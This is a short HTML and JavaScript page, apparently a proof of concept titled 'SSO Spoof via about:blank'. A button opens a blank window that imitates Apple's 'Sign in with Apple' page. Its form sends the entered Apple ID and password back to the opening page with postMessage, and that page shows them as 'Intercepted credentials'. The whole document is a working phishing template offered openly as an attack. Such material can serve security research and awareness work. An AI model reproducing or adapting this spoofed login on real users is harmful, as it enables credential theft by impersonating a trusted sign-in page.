<html>
<head><title>SSO Spoof via about:blank</title></head>
<body>
  <button onclick="runSSOSpoof()">Open Fake Apple SSO</button>
  <script>
    function runSSOSpoof() {
      const ssoHTML = `
        <html><body style='font-family:-apple-system;'>
        <h2>üîê Sign in with Apple</h2>
        <form onsubmit=\"window.opener.postMessage({email:email.value,password:pw.value},'*');return false;\">
          <input id='email' placeholder='Apple ID' style='width:100%'><br>
          <input id='pw' type='password' placeholder='Password' style='width:100%'><br>
          <button type='submit'>Continue</button>
        </form></body></html>
      `;
      const win = window.open("about:blank", "sso");
      win.document.write(ssoHTML);
    }
    window.addEventListener("message", e => {
      alert("Intercepted credentials: " + JSON.stringify(e.data));
    });
  </script>
</body>
</html>
